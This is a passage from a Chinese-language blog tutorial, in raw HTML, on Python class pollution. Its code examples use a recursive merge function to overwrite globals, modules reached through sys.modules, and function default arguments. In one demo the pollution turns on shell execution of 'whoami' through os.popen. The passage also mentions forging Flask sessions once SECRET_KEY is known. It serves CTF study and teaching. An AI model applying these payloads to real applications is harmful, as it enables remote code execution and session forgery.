class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\">instance = b()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span> : &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__globals__&quot;</span> : &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;secret_var&quot;</span> : <span class=\"number\">514</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;a&quot;</span> : &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;secret_class_var&quot;</span> : <span class=\"string\">&quot;Pooooluted ~&quot;</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.secret_class_var)</span><br><span class=\"line\"><span class=\"comment\">#secret</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(secret_var)</span><br><span class=\"line\"><span class=\"comment\">#114</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.secret_class_var)</span><br><span class=\"line\"><span class=\"comment\">#Pooooluted ~</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(secret_var)</span><br><span class=\"line\"><span class=\"comment\">#514</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"3-已加载模块获取\"><a class=\"markdownIt-Anchor\" href=\"#3-已加载模块获取\">#</a> 3、已加载模块获取：</h2>\n<p>​\t\t局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了</p>\n<h3 id=\"加载关系简单\"><a class=\"markdownIt-Anchor\" href=\"#加载关系简单\">#</a> 加载关系简单：</h3>\n<p>​\t\t在加载关系简单的情况下，我们可以直接从文件的 <code>import</code>  语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#test.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> test_1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">cls</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"comment\"># Recursive merge function</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\">instance = cls()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span> : &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;test_1&quot;</span> : &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;secret_var&quot;</span> : <span class=\"number\">514</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;target_class&quot;</span> : &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;secret_class_var&quot;</span> : <span class=\"string\">&quot;Poluuuuuuted ~&quot;</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.secret_var)</span><br><span class=\"line\"><span class=\"comment\">#secret</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.target_class.secret_class_var)</span><br><span class=\"line\"><span class=\"comment\">#114</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.secret_var)</span><br><span class=\"line\"><span class=\"comment\">#514</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.target_class.secret_class_var)</span><br><span class=\"line\"><span class=\"comment\">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#test_1.py</span></span><br><span class=\"line\"></span><br><span class=\"line\">secret_var = <span class=\"number\">114</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">target_class</span>:</span><br><span class=\"line\">    secret_class_var = <span class=\"string\">&quot;secret&quot;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"加载关系复杂示例\"><a class=\"markdownIt-Anchor\" href=\"#加载关系复杂示例\">#</a> 加载关系复杂–示例：</h3>\n<p>​\t\t如 <code>CTF</code>  题目等实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中 <code>import</code>  语法查找就十分困难，而解决方法则是利用 <code>sys</code>  模块</p>\n<p>​\t\t <code>sys</code>  模块的 <code>modules</code>  属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块.`</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#test.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> test_1</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">cls</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"comment\"># Recursive merge function</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\">instance = cls()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span> : &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;sys&quot;</span> : &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;modules&quot;</span> : &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;test_1&quot;</span> : &#123;</span><br><span class=\"line\">                        <span class=\"string\">&quot;secret_var&quot;</span> : <span class=\"number\">514</span>,</span><br><span class=\"line\">                        <span class=\"string\">&quot;target_class&quot;</span> : &#123;</span><br><span class=\"line\">                            <span class=\"string\">&quot;secret_class_var&quot;</span> : <span class=\"string\">&quot;Poluuuuuuted ~&quot;</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.secret_var)</span><br><span class=\"line\"><span class=\"comment\">#secret</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.target_class.secret_class_var)</span><br><span class=\"line\"><span class=\"comment\">#114</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.secret_var)</span><br><span class=\"line\"><span class=\"comment\">#514</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(test_1.target_class.secret_class_var)</span><br><span class=\"line\"><span class=\"comment\">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#test_1.py</span></span><br><span class=\"line\"></span><br><span class=\"line\">secret_var = <span class=\"number\">114</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">target_class</span>:</span><br><span class=\"line\">    secret_class_var = <span class=\"string\">&quot;secret&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t当然我们去使用的 <code>Payload</code>  绝大部分情况下是不会这样的，如上的 <code>Payload</code>  实际上是在已经 <code>import sys</code>  的情况下使用的，而大部分情况是没有直接导入的，这样问题就从<strong>寻找 <code>import</code>  特定模块的语句</strong>转换为<strong>寻找 <code>import</code>  了 sys 模块的语句</strong>，对问题解决的并不见得有多少优化</p>\n<h2 id=\"4-函数形参默认值替换\"><a class=\"markdownIt-Anchor\" href=\"#4-函数形参默认值替换\">#</a> 4、函数形参默认值替换：</h2>\n<p>​\t\t主要用到了函数的 <code>__defaults__</code> 和 <code>__kwdefaults__</code> 这两个内置属性</p>\n<h4 id=\"__defaults__\"><a class=\"markdownIt-Anchor\" href=\"#__defaults__\">#</a>  <code>__defaults__</code> ：</h4>\n<p>​\t\t <code>__defaults__</code> 以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参 + 键值形参，关于函数的参数分类可以参考这篇文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTIyNzM0NjU=\">python 函数的位置参数 (Positional) 和关键字参数 (keyword) - 知乎 (zhihu.com)</span></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_a</span>(<span class=\"params\">var_1, var_2 =<span class=\"number\">2</span>, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_b</span>(<span class=\"params\">var_1, /, var_2 =<span class=\"number\">2</span>, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_c</span>(<span class=\"params\">var_1, var_2 =<span class=\"number\">2</span>, *, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_d</span>(<span class=\"params\">var_1, /, var_2 =<span class=\"number\">2</span>, *, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_a.__defaults__)</span><br><span class=\"line\"><span class=\"comment\">#(2, 3)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_b.__defaults__)</span><br><span class=\"line\"><span class=\"comment\">#(2, 3)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_c.__defaults__)</span><br><span class=\"line\"><span class=\"comment\">#(2,)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_d.__defaults__)</span><br><span class=\"line\"><span class=\"comment\">#(2,)</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如 <code>JSON</code>  等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">evilFunc</span>(<span class=\"params\">arg_1 , shell = <span class=\"literal\">False</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> shell:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(arg_1)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">__import__</span>(<span class=\"string\">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">cls</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"comment\"># Recursive merge function</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\">instance = cls()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span> : &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;evilFunc&quot;</span> : &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;__defaults__&quot;</span> : (</span><br><span class=\"line\">                    <span class=\"literal\">True</span> ,</span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">evilFunc(<span class=\"string\">&quot;whoami&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#whoami</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\">evilFunc(<span class=\"string\">&quot;whoami&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#article-kelp</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"__kwdefaults__\"><a class=\"markdownIt-Anchor\" href=\"#__kwdefaults__\">#</a>  <code>__kwdefaults__</code></h3>\n<p>​\t\t <code>__kwdefaults__</code> 以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_a</span>(<span class=\"params\">var_1, var_2 =<span class=\"number\">2</span>, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_b</span>(<span class=\"params\">var_1, /, var_2 =<span class=\"number\">2</span>, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_c</span>(<span class=\"params\">var_1, var_2 =<span class=\"number\">2</span>, *, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_d</span>(<span class=\"params\">var_1, /, var_2 =<span class=\"number\">2</span>, *, var_3 = <span class=\"number\">3</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_a.__kwdefaults__)</span><br><span class=\"line\"><span class=\"comment\">#None</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_b.__kwdefaults__)</span><br><span class=\"line\"><span class=\"comment\">#None</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_c.__kwdefaults__)</span><br><span class=\"line\"><span class=\"comment\">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(func_d.__kwdefaults__)</span><br><span class=\"line\"><span class=\"comment\">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t通过替换该属性便能实现对函数键值形参的默认值替换</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">evilFunc</span>(<span class=\"params\">arg_1 , * , shell = <span class=\"literal\">False</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> shell:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(arg_1)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">__import__</span>(<span class=\"string\">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">cls</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"comment\"># Recursive merge function</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\">instance = cls()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span> : &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;evilFunc&quot;</span> : &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;shell&quot;</span> : <span class=\"literal\">True</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">evilFunc(<span class=\"string\">&quot;whoami&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#whoami</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\">evilFunc(<span class=\"string\">&quot;whoami&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#article-kelp</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"5-secret_key\"><a class=\"markdownIt-Anchor\" href=\"#5-secret_key\">#</a> 5、SECRET_KEY：</h2>\n<p>​\t\t决定 <code>flask</code>  的 <code>session</code>  生成的重要参数，知道该参数可以实现 <code>session</code>  任意伪造。</p>\n<h1 id=\"最后的补充\"><a class=\"markdownIt-Anchor\" href=\"#最后的补充\">#</a> 最后的补充：</h1>\n<h2 id=\"1-merge函数\"><a class=\"markdownIt-Anchor\" href=\"#1-merge函数\">#</a> 1、merge 